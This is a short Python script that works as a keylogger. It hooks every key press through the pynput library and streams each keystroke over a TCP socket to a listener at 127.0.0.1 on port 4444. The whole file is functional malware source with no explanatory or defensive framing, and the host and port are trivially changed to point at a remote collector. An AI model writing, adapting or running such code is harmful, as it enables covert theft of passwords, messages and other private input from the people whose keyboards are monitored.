import socket
from pynput import keyboard

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1', 4444))

def on_press(key):
    try:
        client_socket.send(str(key).encode('utf-8'))
    except Exception as e:
        print("Error occured: ", e)

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()



if __name__ == "__main__":
    main()
